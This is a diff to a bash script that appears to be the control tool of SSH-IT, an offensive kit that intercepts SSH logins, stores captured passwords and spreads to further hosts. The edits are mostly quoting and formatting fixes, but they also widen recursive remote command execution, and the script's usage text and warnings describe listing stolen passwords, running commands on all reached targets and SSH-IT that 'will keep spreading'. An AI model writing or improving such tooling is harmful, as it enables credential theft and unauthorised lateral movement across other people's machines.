@@ -158,7 +158,7 @@ recursive()
 	PX="${dx}"
 
 	n_logins && n=0 || n=$?
-	[[ $n -le 0 ]] && { echo -e "[${CF}No logins captured${CN}]"; do${cmd}; return 0; }
+	[[ $n -le 0 ]] && { echo -e "[${CF}No logins captured${CN}]"; "do${cmd}"; return 0; }
 	echo -e "[${CF}$n logins captured${CN}]"
 
 	source "${THC_BASEDIR}/depth.cfg"
@@ -179,14 +179,14 @@ recursive()
 			value="${CDC}${LOG_PASSWORD}${CN}"
 		fi
 
-		[[ -n $IS_OUTPUT_TREE ]] && echo -en "${PX}${CDG}${LOG_SSH_DESTINATION}${CN}[${value}]"
+		[[ -n $IS_OUTPUT_TREE ]] && echo -en "${PX}${CDG}${LOG_SSH_HOST_ID}${CN}[${value}]"
 
 		[[ -z $IS_RECURSIVE ]] && { [[ -n $IS_OUTPUT_TREE ]] && echo ""; continue; }
 
 		# Recursive. No need to login if DEPTH is 0 here (e.g. we did not infiltrate remote)
-		if [[ "$THC_DEPTH" -gt 0 ]]; then
+		if [[ "$THC_DEPTH" -gt 0 ]] || [[ -n $THC_CLI_ARG ]]; then
 			NEW_T_PREFIX="${THC_T_PREFIX}│   "
-			[[ -n $IS_MARK_PX_LAST ]] && [[ $n -eq 0 ]] && NEW_T_PREFIX="${THC_T_PREFIX}    " # last host
+			[[ -n $IS_MARK_PX_LAST ]] && [[ $n -eq 0 ]] && NEW_T_PREFIX="${THC_T_PREFIX}    " # last host, no "|" needed
 
 			# Must escape [`$"'] so that 'bash -c' does not evaluate them. In particular we like this to work:
 			#     thc_cli -r exec 'echo user=$USER'
@@ -202,10 +202,10 @@ recursive()
 
 			# We need to consider the special case when we got the login credentials but
 			# SSH-IT is not installed on the remote host. In this case we still like to execute
-			# our command but must do so without ~/.prng/thc_cli being available on the remote side
+			# our command but must do so without ~/.prng/thc_cli being available on the remote host.
 			if [[ -n $THC_CLI_ARG ]]; then
+				# shellcheck disable=SC2001
 				NEW_THC_CLI_ARG="$(echo "$THC_CLI_ARG"|sed 's/[`\\$\"'"'"']/\\&/g')"
-				# nPX="$(echo "${NEW_T_PREFIX}"|tr '#' ' ')"
 				nPX="${NEW_T_PREFIX}"
 
 				# Use 'kill $$' to detect if command executed successfully (neater would be to use 'set -o pipefail'
@@ -234,17 +234,17 @@ recursive()
 				{ [[ $err = *"resolve"* ]] && echo -e "[${CDR}Could not resolve hostname${CN}]"; } || \
 				{ [[ -n $err ]] && echo -e "[${CR}ERROR: $(echo -n "$err" | tr -d \\r | head -n1)${CN}]"; }
 				PX="${dx}│   "
-				do_not${cmd}
+				"do_not${cmd}"
 			fi
 		else
-			echo -e "[SSH-IT ends here]"
+			echo -e "[DEPTH reached. SSH-IT ends here]"
 			PX="${dx}│   "
-			do${cmd}
+			"do${cmd}"
 		fi
 	done
 
 	PX="${dx}"
-	do${cmd}
+	"do${cmd}"
 
 	return "$ret"
 }
@@ -299,12 +299,12 @@ uninstall_r()
 
 uninstall()
 {
-	[[ -z $IS_RECURSIVE ]] && [[ -z $IS_FORCE ]] && { WARN 0 "\n"\
-"  Using uninstall without -r is dangerous. Doing so will remove SSH-IT from\n"\
-"  _this_ host only. Any login information to any other host will be lost.\n"\
-"  Access to SSH-IT spread beyond _this_ host will be lost but SSH-IT will\n"\
-"  keep spreading. Use -f to overwrite or to delete SSH-IT from _all_ hosts\n"\
-"  use -r:\n"\
+	[[ -z $IS_RECURSIVE ]] && [[ -z $IS_FORCE ]] && { WARN 0 "\n" \
+"  Using uninstall without -r is dangerous. Doing so will remove SSH-IT from\n" \
+"  _this_ host only. Any login information to any other host will be lost.\n" \
+"  Access to SSH-IT spread beyond _this_ host will be lost but SSH-IT will\n" \
+"  keep spreading. Use -f to overwrite or to delete SSH-IT from _all_ hosts\n" \
+"  use -r:\n" \
 "          ${CDM}${PRG} -r uninstall${CN}"; exit 0; }
 
 	echo -en "${CDY}$(hostname)${CN}"
@@ -332,17 +332,17 @@ usage()
 {
 	[[ -n $2 ]] && echo -e >&2 "$2"
 
-	echo -e >&2 ""\
-"usage: $PRG [-hr] [command]\n"\
-"    -h          This help\n"\
-"    -r          Recursive (for all hosts)\n"\
-"Command:\n"\
-"    list       - Show passwords\n"\
-"    exec <cmd> - Execute <cmd> on target [e.g. $PRG -r exec \"id; date\"]\n"\
-"    clean      - Clean logfiles and state information\n"\
-"    disable    - Disable interception\n"\
-"    uninstall  - Clean, disable and completely remove\n"\
-"Example: $PRG -r list"
+	echo -e >&2 "\
+usage: $PRG [-hr] [command]
+    -h          This help
+    -r          Recursive (for all hosts)
+Command:
+    list       - Show passwords
+    exec <cmd> - Execute <cmd> on target [e.g. $PRG -r exec \"id; date\"]
+    clean      - Clean logfiles and state information
+    disable    - Disable interception
+    uninstall  - Clean, disable and completely remove
+Example: $PRG -r list"
 
 	exit "$1"
 }
@@ -351,7 +351,7 @@ init_vars()
 {
 	local cmd
 	PX=""
-	PRG="$(basename $0)"
+	PRG="$(basename "$0")"
 	while getopts ":hrf" opt; do
 		case ${opt} in
 			h )
@@ -363,6 +363,9 @@ init_vars()
 				;;
 			f )
 				IS_FORCE=1
+				;;
+			* )
+				usage 255
 				;;
 		esac
 	done
